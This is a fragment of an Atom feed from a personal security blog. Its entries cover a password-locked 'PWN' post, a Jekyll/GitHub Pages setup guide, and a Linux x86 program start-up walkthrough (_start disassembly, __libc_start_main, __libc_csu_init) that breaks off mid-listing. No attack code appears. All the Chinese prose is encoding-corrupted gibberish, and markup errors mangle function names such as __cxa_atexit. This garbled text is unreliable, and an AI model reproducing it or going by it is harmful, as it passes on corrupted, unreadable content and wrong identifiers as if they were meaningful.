    <content type="html"><![CDATA[<script src="/crypto-js.js"></script><script src="/mcommon.js"></script><h3 id="encrypt-message">Please enter the password to read the blog.</h3><link rel="stylesheet" href="//cdn.bootcss.com/bootstrap/3.3.5/css/bootstrap.min.css"> <link rel="stylesheet" href="//cdn.bootcss.com/bootstrap/3.3.5/css/bootstrap-theme.min.css"> <script src="//cdn.bootcss.com/jquery/1.11.3/jquery.min.js"></script> <script src="//cdn.bootcss.com/bootstrap/3.3.5/js/bootstrap.min.js"></script> <div id="security"> <div> <div class="input-group"> <input type="text" class="form-control" aria-label="Enter the password." id="pass"/> <div class="input-group-btn"> <button type="button" class="btn btn-default" onclick="decryptAES()">Decrypt</button> </div> </div> </div> </div> <div id="encrypt-blog" style="display:none">  </div>]]></content>
    
    
    <summary type="html">The article has been encrypted, please enter your password to view.&lt;br&gt;</summary>
    
    
    
    
    <category term="PWN" scheme="https://pz1o.top/tags/PWN/"/>
    
  </entry>
  
  <entry>
    <title>execve</title>
    <link href="https://pz1o.top/2021/06/04/execve/"/>
    <id>https://pz1o.top/2021/06/04/execve/</id>
    <published>2021-06-04T11:17:07.000Z</published>
    <updated>2021-06-04T11:17:07.684Z</updated>
    
    
    
    
    
  </entry>
  
  <entry>
    <title>ÂçöÂÆ¢ËøÅÁßª</title>
    <link href="https://pz1o.top/2021/06/03/%E5%8D%9A%E5%AE%A2%E8%BF%81%E7%A7%BB/"/>
    <id>https://pz1o.top/2021/06/03/%E5%8D%9A%E5%AE%A2%E8%BF%81%E7%A7%BB/</id>
    <published>2021-06-03T10:13:10.000Z</published>
    <updated>2021-06-09T11:45:08.520Z</updated>
    
    <content type="html"><![CDATA[<p>ÂêÉÈ•±‰∫ÜÊíëÁöÑÔºåÊàëË¶ÅÊç¢blog</p><a id="more"></a><p>ËøòÊòØ‰∏çÊç¢‰∫ÜÔºåjekyllÂ±ÖÁÑ∂‰∏çËÉΩÂä†ÂØÜ„ÄÇ</p><h1 id="0x01-Âü∫Á°ÄÁéØÂ¢É"><a href="#0x01-Âü∫Á°ÄÁéØÂ¢É" class="headerlink" title="0x01 Âü∫Á°ÄÁéØÂ¢É"></a>0x01 Âü∫Á°ÄÁéØÂ¢É</h1><p>ÂÖà‰∏ãËΩΩruby<a href="https://rubyinstaller.org/downloads/archives/" target="_blank" rel="noopener">Download Archives (rubyinstaller.org)</a></p><p>Âíågem<a href="https://rubygems.org/pages/download" target="_blank" rel="noopener">Download RubyGems | RubyGems.org | Ruby Á§æÂå∫ Gem ÊâòÁÆ°</a></p><p>ÁÑ∂ÂêéËß£Âéãgem</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ruby setup.rb</span><br><span class="line">gem install jekyll</span><br><span class="line">jekyll --version</span><br></pre></td></tr></table></figure><p>ÊµãËØï‰∏Ä‰∏ã</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">jekyll new blog</span><br><span class="line">cd blog</span><br><span class="line">jekyll serve</span><br></pre></td></tr></table></figure><p>ÊµãËØïÊàêÂäüÂç≥ÂèØ</p><h1 id="0x02-ÈÄâÊã©‰∏ªÈ¢ò"><a href="#0x02-ÈÄâÊã©‰∏ªÈ¢ò" class="headerlink" title="0x02 ÈÄâÊã©‰∏ªÈ¢ò"></a>0x02 ÈÄâÊã©‰∏ªÈ¢ò</h1><p>ÊàëÈÄâÊã©ÁöÑÊòØËøô‰∏™‰∏ªÈ¢ò<a href="https://github.com/Huxpro/huxpro.github.io" target="_blank" rel="noopener">Huxpro/huxpro.github.io: My Blog / Jekyll Themes / PWA</a></p><p>Áõ¥Êé•‰∏ãËΩΩÊ∫êÁ†ÅËß£Âéã</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">bundle install</span><br><span class="line">jekyll serve</span><br></pre></td></tr></table></figure><p>ÂÜôÊñáÁ´†ÁöÑËØùÂ∞±Âú®postÁõÆÂΩï‰∏ãÂÜô</p><p>ÁÑ∂Âêé</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">jekyll build</span><br></pre></td></tr></table></figure><h1 id="0x03-github-pages"><a href="#0x03-github-pages" class="headerlink" title="0x03 github pages"></a>0x03 github pages</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">mkdir pz1o.github.io</span><br><span class="line">git init pz1o.github.io</span><br><span class="line">cd pz1o.github.io</span><br></pre></td></tr></table></figure><p>ÂàõÂª∫gemfile</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">source &#39;https:&#x2F;&#x2F;rubygems.org&#39;</span><br><span class="line">gem &#39;github-pages&#39;, group: :jekyll_plugins</span><br></pre></td></tr></table></figure><p>Ê≠§Â§ñËøòÂèØ‰ª•Êç¢Ê∫ê</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bundle config mirror.https:&#x2F;&#x2F;rubygems.org https:&#x2F;&#x2F;ruby.taobao.org</span><br></pre></td></tr></table></figure><p>Â¶Ç‰ΩïÊèê‰∫§</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">#ÁªëÂÆöËøúÁ®ã‰ªìÂ∫ì</span><br><span class="line">git remote add origin https:&#x2F;&#x2F;github.com&#x2F;Pz1o&#x2F;Pz1o.github.io.git</span><br><span class="line">git remote -v</span><br><span class="line"></span><br><span class="line">git status</span><br><span class="line">git add .</span><br><span class="line">git commit -m &quot;&quot;</span><br><span class="line">git push origin master -f</span><br><span class="line"></span><br><span class="line">#Ëß£ÂÜ≥ÊØèÊ¨°pushÂæóËæìÂÖ•ÂØÜÁ†ÅÁöÑÈóÆÈ¢ò</span><br><span class="line">git remote rm origin</span><br><span class="line">git remote add origin git@github.com:Pz1o&#x2F;Pz1o.github.io.git</span><br><span class="line">git push origin master -f</span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">&lt;p&gt;ÂêÉÈ•±‰∫ÜÊíëÁöÑÔºåÊàëË¶ÅÊç¢blog&lt;/p&gt;</summary>
    
    
    
    
    <category term="others" scheme="https://pz1o.top/tags/others/"/>
    
  </entry>
  
  <entry>
    <title>file system</title>
    <link href="https://pz1o.top/2021/06/03/file-system/"/>
    <id>https://pz1o.top/2021/06/03/file-system/</id>
    <published>2021-06-03T09:32:47.000Z</published>
    <updated>2021-06-03T12:22:01.130Z</updated>
    
    
    
    
    
    <category term="kernel" scheme="https://pz1o.top/tags/kernel/"/>
    
  </entry>
  
  <entry>
    <title>Linux x86 Program</title>
    <link href="https://pz1o.top/2021/06/02/Linux-x86-Program/"/>
    <id>https://pz1o.top/2021/06/02/Linux-x86-Program/</id>
    <published>2021-06-02T12:19:10.000Z</published>
    <updated>2021-06-09T11:44:47.966Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Linux-x86-Program-Start-Up"><a href="#Linux-x86-Program-Start-Up" class="headerlink" title="Linux x86 Program Start Up"></a>Linux x86 Program Start Up</h1><p>Êàë‰ª¨Âè™ÂÖ≥Ê≥®x86ÁöÑÁ®ãÂ∫è</p><a id="more"></a><p><img src="/2021/06/02/Linux-x86-Program/callgraph.png" alt="image of the callgraph for all the routines involved in program startup on linux"></p><h2 id="0x01-how-did-we-get-to-main"><a href="#0x01-how-did-we-get-to-main" class="headerlink" title="0x01 how did we get to main?"></a>0x01 how did we get to main?</h2><p>Êàë‰ª¨ÂèØ‰ª•ÂÖàÂÜô‰∏Ä‰∏™Á©∫‰∏ªÂáΩÊï∞ÔºåÁúã‰∏Ä‰∏ãÂÖ∂‰∏≠ÁöÑÊ±áÁºñ„ÄÇ</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">gcc -g main.c -m32 -o main</span><br><span class="line">objdump -d main -M intel &gt; main.dump</span><br></pre></td></tr></table></figure><h2 id="0x02-But-first-how-do-we-get-to-start"><a href="#0x02-But-first-how-do-we-get-to-start" class="headerlink" title="0x02 But first, how do we get to _start?"></a>0x02 But first, how do we get to _start?</h2><p>ÂΩìÊâßË°å‰∏Ä‰∏™Á®ãÂ∫èÊó∂Ôºåshell‰ºöË∞ÉÁî®linux‰∏ãÁöÑÁ≥ªÁªüÂáΩÊï∞exceve()„ÄÇÁ≥ªÁªüÂ∞Ü‰ºöËÆæÁΩÆ‰∏Ä‰∏™Ê†àÔºåÂ∞Ü<code>argc</code> <code>argv</code> <code>envp</code>ÂéãÂÖ•Ê†à‰∏≠„ÄÇ‰πãÂêéÂä†ËΩΩÂô®ÈáçÂÆö‰ΩçÔºåÈ¢ÑÂàùÂßãÂåñÂáΩÊï∞„ÄÇ</p><p>ÂΩì‰∏ÄÂàá‰ªªÂä°ÂÆåÊØïÂêéÔºåÈÄöËøáË∞ÉÁî®<code>_start()</code>Â∞ÜÊéßÂà∂ÊùÉ‰∫§Áªô‰Ω†ÁöÑÁ®ãÂ∫è„ÄÇ</p><p>ËøôÈáåÊúâ<code>_start()</code>ÂèçÊ±áÁºñ</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">080482e0 &lt;_start&gt;:</span><br><span class="line"> 80482e0:31 ed                xor    ebp,ebp</span><br><span class="line"> 80482e2:5e                   pop    esi</span><br><span class="line"> 80482e3:89 e1                mov    ecx,esp</span><br><span class="line"> 80482e5:83 e4 f0             and    esp,0xfffffff0</span><br><span class="line"> 80482e8:50                   push   eax</span><br><span class="line"> 80482e9:54                   push   esp</span><br><span class="line"> 80482ea:52                   push   edx</span><br><span class="line"> 80482eb:68 50 84 04 08       push   0x8048450</span><br><span class="line"> 80482f0:68 f0 83 04 08       push   0x80483f0</span><br><span class="line"> 80482f5:51                   push   ecx</span><br><span class="line"> 80482f6:56                   push   esi</span><br><span class="line"> 80482f7:68 db 83 04 08       push   0x80483db</span><br><span class="line"> 80482fc:e8 bf ff ff ff       call   80482c0 &lt;__libc_start_main@plt&gt;</span><br><span class="line"> 8048301:f4                   hlt    ;stop</span><br><span class="line"> 8048302:66 90                xchg   ax,ax</span><br><span class="line"> 8048304:66 90                xchg   ax,ax</span><br><span class="line"> 8048306:66 90                xchg   ax,ax</span><br><span class="line"> 8048308:66 90                xchg   ax,ax</span><br><span class="line"> 804830a:66 90                xchg   ax,ax</span><br><span class="line"> 804830c:66 90                xchg   ax,ax</span><br><span class="line"> 804830e:66 90                xchg   ax,ax</span><br></pre></td></tr></table></figure><p>xorÂ∞±ÊòØÂ∞ÜebpÁΩÆ‰∏∫0„ÄÇÊé•‰∏ãÊù•Ôºå‰ªéÊ†à‰∏≠ÂºπÂá∫Ê†àÈ°∂ÁöÑÂÄºÂà∞esi‰∏≠„ÄÇÊúÄÂºÄÂßãÊó∂ÔºåÊàë‰ª¨Êää<code>argc</code> <code>argv</code> <code>envp</code>ÊîæÂÖ•‰∫ÜÊ†àÈáåÔºåÊâÄ‰ª•Áé∞Âú®Â∞±Êää<code>argc</code>ÊîæÂà∞<code>esi</code>‰∏≠„ÄÇÂõ†‰∏∫ÂºπÂá∫‰∫ÜÂèÇÊï∞ÔºåÊâÄ‰ª•Áé∞Âú®espÊåáÂêë<code>argv</code>„ÄÇ</p><p>‰πãÂêéÂ∞ÜespÁöÑÂÄºÊîæÂÖ•ecx‰∏≠ÔºåÂπ∂‰∏îËÆ©espËøõË°å<code>and</code>Êìç‰ΩúÔºåÊ∏ÖÈô§ÂêéÂõõ‰Ωç„ÄÇ</p><blockquote><p>‰∏∫‰ªÄ‰πàË¶ÅËøô‰πàÂÅöÔºü</p><p>Ëøô‰πàÂÅöÔºåÂèØ‰ª•ËÆ©esp‰∏ãÈôç0-15‰∏™Â≠óËäÇÔºå‰øùËØÅÊ†àÊåáÈíàÊó∂16Â≠óËäÇÂÅ∂Êï∞ÂØπÈΩê„ÄÇÂØπÈΩêÊòØ‰∏∫‰∫Ü‰øùËØÅÊ†à‰∏äÁöÑÊâÄÊúâÂèòÈáèËÉΩË¢´ÂÜÖÂ≠òÂíåcacheÁöÑÂø´ÈÄüËÆøÈóÆ„ÄÇËøôÈáåÊèêÂà∞‰∫ÜSSEÔºåÂ∞±ÊòØÊåá‰ª§ÈÉΩËÉΩÂú®ÂçïÁ≤æÂ∫¶ÊµÆÁÇπÊï∞ÁªÑ‰∏äÂ∑•‰ΩúÁöÑÈÇ£‰∏™ÔºàÊâ©Â±ïÊåá‰ª§ÈõÜÔºâ„ÄÇ</p><p>‰∏æ‰∏™Ê†óÂ≠êÔºö</p><p>ÊØîÂ¶Ç<code>_start</code>ÁöÑÂÖ•Âè£ÊòØ0xbffff770,ÂΩìÊàë‰ª¨Â∞Ü<code>argc</code>ÂºπÂá∫Ê†àÊó∂ÔºåespÂ∞±ÂèòÊàê‰∫Ü0xbffff774„ÄÇÂÆÉÂèòÂà∞‰∫ÜÈ´òÂú∞ÂùÄ„ÄÇÂΩìËøõË°åÂÆåandÊìç‰ΩúÂêéÔºåÂ∞±ÂèàÂèòÊàê‰∫ÜÂéüÊù•ÁöÑÂÄºÔºåÊåáÂêë‰∫Ü0xbffff770„ÄÇ</p></blockquote><h2 id="0x03-Now-set-up-for-calling-libc-start-main"><a href="#0x03-Now-set-up-for-calling-libc-start-main" class="headerlink" title="0x03 Now set up for calling __libc_start_main"></a>0x03 Now set up for calling __libc_start_main</h2><p>Áé∞Âú®Êàë‰ª¨Â∞ÜÊää<code>__libc_start_main</code>ÁöÑÂèÇÊï∞ÂéãÂÖ•Ê†à‰∏≠„ÄÇÁ¨¨‰∏Ä‰∏™eaxÔºåÂÖ∂ÂÆûÊòØ‰∏Ä‰∏™ÂûÉÂúæÂèÇÊï∞ÔºåÊàë‰ª¨ËøôÊ†∑ÂÅöÁöÑÁõÆÁöÑÊòØ‰Ωø16Â≠óËäÇÂØπÈΩê„ÄÇÈô§Ê≠§‰πãÂ§ñÊ≤°ÊúâÂÖ∂‰ªñÁî®Â§Ñ„ÄÇ</p><p><code>__libc_start_main</code>ÂéüÂáΩÊï∞Ôºö</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> __libc_start_main(  <span class="keyword">int</span> (*main) (<span class="keyword">int</span>, <span class="keyword">char</span> * *, <span class="keyword">char</span> * *),</span><br><span class="line">    <span class="keyword">int</span> argc, <span class="keyword">char</span> * * ubp_av,</span><br><span class="line">    <span class="keyword">void</span> (*init) (<span class="keyword">void</span>),</span><br><span class="line">    <span class="keyword">void</span> (*fini) (<span class="keyword">void</span>),</span><br><span class="line">    <span class="keyword">void</span> (*rtld_fini) (<span class="keyword">void</span>),</span><br><span class="line">    <span class="keyword">void</span> (* stack_end));</span><br></pre></td></tr></table></figure><p>Êàë‰ª¨ËÆ©<code>_start</code>ÂáΩÊï∞Êää<code>__libc_start_main</code>ÁöÑÂèÇÊï∞ÈÄÜÂ∫èÂéãÂÖ•Ê†à‰∏≠„ÄÇ</p><div class="table-container"><table><thead><tr><th>ÂÄº</th><th>ÂèÇÊï∞</th><th>ÂÜÖÂÆπ</th></tr></thead><tbody><tr><td>eax</td><td>Êó†</td><td>Êó†</td></tr><tr><td>esp</td><td>void (* stack_end)</td><td>Â∑≤Ë¢´ÂØπÈΩêÁöÑÊ†àÊåáÈíà</td></tr><tr><td>edx</td><td>void (*rtld_fini) (void)</td><td>Âä†ËΩΩÂô®‰º†Âà∞edx‰∏≠ÁöÑÂä®ÊÄÅÈìæÊé•Âô®ÁöÑÊûêÊûÑÂáΩÊï∞„ÄÇ<br>Ë¢´<strong>libc_start_mainÂáΩÊï∞ÈÄöËøá</strong>cxat_exit()Ê≥®ÂÜåÔºå<br>‰∏∫Êàë‰ª¨Â∑≤ÁªèÂä†ËΩΩÁöÑÂä®ÊÄÅÂ∫ìË∞ÉÁî®FINI section</td></tr><tr><td>0x8048450</td><td>void (*fini) (void)</td><td><strong>libc_csu_fini‚Äî‚ÄîÁ®ãÂ∫èÁöÑÊûêÊûÑÂáΩÊï∞„ÄÇ<br>Ë¢´</strong>libc_start_main ÈÄöËøá __cxat_exit()Ê≥®ÂÜå</td></tr><tr><td>0x80483f0</td><td>void (*init) (void)</td><td><strong>libc_csu_init‚Äî‚ÄîÁ®ãÂ∫èÁöÑÊûÑÈÄ†ÂáΩÊï∞„ÄÇ<br>‰∫émainÂáΩÊï∞‰πãÂâçË¢´</strong>libc_start_mainÂáΩÊï∞Ë∞ÉÁî®</td></tr><tr><td>ecx</td><td>char <em> </em> ubp_av</td><td>argvÁõ∏ÂØπÊ†àÁöÑÂÅèÁßªÂÄº</td></tr><tr><td>esi</td><td>int argc</td><td>argcÁõ∏ÂØπÊ†àÁöÑÂÅèÁßªÂÄº</td></tr><tr><td>0x80483db</td><td>int (<em>main) (int, char </em> <em>, char </em> *)</td><td>Êàë‰ª¨Á®ãÂ∫èÁöÑmainÂáΩÊï∞ÔºåË¢´__libc_start_mainÂáΩÊï∞Ë∞ÉÁî®<br>mainÂáΩÊï∞ÁöÑËøîÂõûÂÄºË¢´‰º†ÈÄíÁªôexit()ÂáΩÊï∞ÔºåÁî®‰∫éÁªàÁªìÊàë‰ª¨ÁöÑÁ®ãÂ∫è</td></tr></tbody></table></div><p><code>__libc_csu_init</code>Êé•‰∏ãÊù•Êàë‰ª¨‰ºöÁúã</p><h2 id="0x04-Hey-Where‚Äôs-the-environment-variables"><a href="#0x04-Hey-Where‚Äôs-the-environment-variables" class="headerlink" title="0x04 Hey! Where‚Äôs the environment variables?"></a>0x04 Hey! Where‚Äôs the environment variables?</h2><p>ÂàÜÊûêÂà∞ËøôÔºåÊàë‰ª¨ÂèëÁé∞‰∏Ä‰∏™ÈóÆÈ¢òÔºåÊàë‰ª¨ÁöÑenvpÂéªÂì™Èáå‰∫ÜÔºåÂÆÉ‰∏çÊòØ<code>__libc_start_main</code>‰∏≠ÁöÑ‰∏Ä‰∏™ÂèÇÊï∞„ÄÇ‰ΩÜÊòØÂú®mainÂáΩÊï∞ÈáåÈù¢Ë∞ÉÁî®‰∫Üenvp<code>int main(int argc, char** argv, char** envp)</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">void</span> __libc_init_first(<span class="keyword">int</span> argc, <span class="keyword">char</span> *arg0, ...)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">char</span> **argv = &amp;arg0, **envp = &amp;argv[argc + <span class="number">1</span>];</span><br><span class="line">    __environ = envp;</span><br><span class="line">    __libc_init (argc, argv, envp);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>‰∫ãÂÆû‰∏äÔºå<code>__libc_start_main</code>Ë∞ÉÁî®‰∫Ü<code>__libc_init_first</code>ÔºåËøô‰∏™ÂáΩÊï∞‰ºöÁî®ÂÜÖÈÉ®‰ø°ÊÅØÊâæÂà∞ÁéØÂ¢ÉÂèòÈáèÔºåÔºà‰∫ãÂÆû‰∏äÔºåÁéØÂ¢ÉÂèòÈáèÂ∞±Âú®argvÁöÑÁªàÊ≠¢Â≠óÁ¨¶NULLÁöÑÂêéÈù¢Ôºâ„ÄÇÁÑ∂ÂêéËÆæÁΩÆ‰∏Ä‰∏™ÂÖ®Â±ÄÂèòÈáè<code>__environ</code>ÔºåËøô‰∏™ÂÖ®Â±ÄÂèòÈáèÂèØ‰ª•Ë¢´<code>__libc_start_main</code>ÂáΩÊï∞ÂÜÖÈÉ®‰ªª‰ΩïÂú∞ÊñπË∞ÉÁî®ÔºåÂåÖÊã¨Ë∞ÉÁî®mainÂáΩÊï∞„ÄÇ</strong></p><p>ÂΩì<code>envp</code>Âª∫Á´ã‰∫Ü‰πãÂêéÔºå<code>__libc_start_main</code>ÂáΩÊï∞‰ºö‰ΩøÁî®Áõ∏ÂêåÁöÑÂ∞èÊäÄÂ∑ßÔºåË∂äËøá<code>envp</code>Êï∞ÁªÑ‰πãÂêéÁöÑ<code>NULL</code>Â≠óÁ¨¶ÔºåËé∑ÂèñÂè¶‰∏Ä‰∏™ÂêëÈáè‚Äî‚ÄîELFËæÖÂä©ÂêëÈáèÔºàÂä†ËΩΩÂô®‰ΩøÁî®ÂÆÉÁªôËøõÁ®ã‰º†ÈÄí‰∏Ä‰∫õ‰ø°ÊÅØÔºâ„ÄÇÈÄöËøá‰∏Ä‰∏™ÁÆÄÂçïÁöÑÊñπÊ≥ïÂèØ‰ª•Êü•ÁúãÈáåÈù¢ÁöÑÂÜÖÂÆπÔºöËøêË°åÁ®ãÂ∫èÂâçÔºåËÆæÁΩÆÁéØÂ¢ÉÂèòÈáèLD_SHOW_AUXV=1„ÄÇ</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">‚ùØ LD_SHOW_AUXV&#x3D;1 .&#x2F;main</span><br><span class="line">AT_SYSINFO:      0xf7f93fd0</span><br><span class="line">AT_SYSINFO_EHDR: 0xf7f93000</span><br><span class="line">AT_HWCAP:    fpu vme de pse tsc msr pae mce cx8 apic sep mtrr pge mca cmov pat pse36 clflush mmx fxsr sse sse2 ss</span><br><span class="line">AT_PAGESZ:       4096</span><br><span class="line">AT_CLKTCK:       100</span><br><span class="line">AT_PHDR:         0x8048034</span><br><span class="line">AT_PHENT:        32</span><br><span class="line">AT_PHNUM:        9</span><br><span class="line">AT_BASE:         0xf7f95000</span><br><span class="line">AT_FLAGS:        0x0</span><br><span class="line">AT_ENTRY:        0x80482e0</span><br><span class="line">AT_UID:          1000</span><br><span class="line">AT_EUID:         1000</span><br><span class="line">AT_GID:          0</span><br><span class="line">AT_EGID:         0</span><br><span class="line">AT_SECURE:       0</span><br><span class="line">AT_RANDOM:       0xff828c2b</span><br><span class="line">AT_HWCAP2:       0x0</span><br><span class="line">AT_EXECFN:       .&#x2F;main</span><br><span class="line">AT_PLATFORM:     i686</span><br></pre></td></tr></table></figure><ul><li>AT_ENTRYÔºö<code>_start</code>ÁöÑÂú∞ÂùÄ</li><li>AT_UID/AT_EUID/AT_GID/AT_EGIDÔºöuidÂíåeuid gidÂíåegid</li><li>AT_PHDRÔºöELF program Â§¥ÁöÑÂú∞ÂùÄ0x8048034</li><li>AT_PHENTÔºöheader entryÁöÑÂ≠óËäÇÊï∞</li></ul><h2 id="0x05-libc-start-main-in-general"><a href="#0x05-libc-start-main-in-general" class="headerlink" title="0x05 __libc_start_main in general"></a>0x05 __libc_start_main in general</h2><p>Êàë‰ª¨Êù•‰∫ÜËß£‰∏Ä‰∏ã<code>__libc_start_main</code>ÁöÑÁªÜËäÇÔºå‰∏ªË¶ÅÂäüËÉΩÊúâ‰ª•‰∏ãÔºö</p><ol><li>ÂÖ≥Ê≥®setuidÂíåsetgidÁöÑÂÆâÂÖ®ÈóÆÈ¢ò</li><li>ÂêØÂä®Á∫øÁ®ã</li><li>Êää<code>fini</code>ÂáΩÊï∞Âíå<code>rtld_fini</code>ÂáΩÊï∞‰Ωú‰∏∫ÂèÇÊï∞‰º†ÈÄíÁªô<code>at_exit</code>Ë∞ÉÁî®Ôºå‰ΩøÂÆÉ‰ª¨Âú®<code>at_exit</code>ÈáåË¢´Ë∞ÉÁî®Ôºå‰ªéËÄåÂÆåÊàêÁî®Êà∑Á®ãÂ∫èÂíåÂä†ËΩΩÂô®ÁöÑË∞ÉÁî®ÁªìÊùü‰πãÂêéÁöÑÊ∏ÖÁêÜÂ∑•‰Ωú</li><li>Ë∞ÉÁî®<code>init</code>ÁöÑÂèÇÊï∞</li><li>Â∞Ü<code>argc</code>Âíå<code>argv</code>ÂèÇÊï∞‰º†ÈÄíÁªô<code>main</code>ÔºåÂπ∂Ë∞ÉÁî®<code>main</code>„ÄÇÂΩìÁÑ∂Êàë‰ª¨‰πüË¶ÅÊääÂÖ®Â±ÄÂèòÈáè<code>__environ</code>‰º†ÈÄí</li><li>Ë∞ÉÁî®<code>exit</code>Âπ∂‰∏îÂ∏¶Êúâ‰∏ªÂáΩÊï∞ÁöÑËøîÂõûÂÄº</li></ol><p><strong>Calling the init argument</strong></p><p><code>__libc_start_main</code>ÁöÑ<code>init</code>ÁöÑÂèÇÊï∞ÔºåÊòØË¢´ËÆæÁΩÆ‰∏∫<code>__libc_csu_init</code>„ÄÇ</p><p>ÂÖ∑‰ΩìÂú®Ê∫êÁ†Åcsu/elf-initÔºåÂÆö‰πâÂ¶Ç‰∏ã</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">void</span></span><br><span class="line">__libc_csu_init (<span class="keyword">int</span> argc, <span class="keyword">char</span> **argv, <span class="keyword">char</span> **envp)</span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line">  _init ();</span><br><span class="line"></span><br><span class="line">  <span class="keyword">const</span> <span class="keyword">size_t</span> <span class="built_in">size</span> = __init_array_end - __init_array_start;</span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">size_t</span> i = <span class="number">0</span>; i &lt; <span class="built_in">size</span>; i++)</span><br><span class="line">      (*__init_array_start [i]) (argc, argv, envp);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="0x06-libc-csu-init-introduction"><a href="#0x06-libc-csu-init-introduction" class="headerlink" title="0x06 __libc_csu_init introduction"></a>0x06 __libc_csu_init introduction</h2><p><code>__libc_csu_init</code>ÊòØÈùûÂ∏∏ÈáçË¶ÅÁöÑÂáΩÊï∞ÔºåÂÆÉÊòØÊàë‰ª¨ÂèØÊâßË°åÁ®ãÂ∫èÁöÑÊûÑÈÄ†ÂáΩÊï∞„ÄÇ</p><p>Êàë‰ª¨ÂèØËÉΩ‰ºöÊúâÁñëÈóÆÂØπ‰∫éÊûÑÈÄ†ÂíåÊûêÊûÑÔºåËØ¥ËøôÊòØc++ÁöÑ‰∏úË•ø„ÄÇ‰ΩÜÊòØÊûÑÈÄ†ÂíåÊûêÊûÑÁöÑÊ¶ÇÂøµÂπ∂‰∏çÊòØc++ÁöÑ„ÄÇ</p><p>ÂØπ‰∫é‰ªªÊÑèÂèØÊâßË°åÁ®ãÂ∫èÈÉΩÊúâ‰∏Ä‰∏™ÊûÑÈÄ†ÂáΩÊï∞<code>__libc_csu_init</code>ÂíåÊûêÊûÑÂáΩÊï∞<code>__libc_csu_fini</code>„ÄÇ</p><p><strong>Âú®ÊûÑÈÄ†ÂáΩÊï∞ÁöÑÂÜÖÈÉ®ÔºåÂèØÊâßË°åÁ®ãÂ∫èÂ∞Ü‰ºöÂØªÊâæÂÖ®Â±ÄCÊûÑÈÄ†ÂáΩÊï∞ÔºåÂπ∂‰∏îË∞ÉÁî®‰ªñ‰ª¨„ÄÇ</strong></p><p>ÂèØËÉΩÂæàÈöæÁêÜËß£Ëøô‰∏™ÁÇπÔºåÊàë‰ª¨Êù•Áúã‰∏Ä‰∏ã<code>__libc_csu_init</code>ÁöÑÂèçÊ±áÁºñ</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span 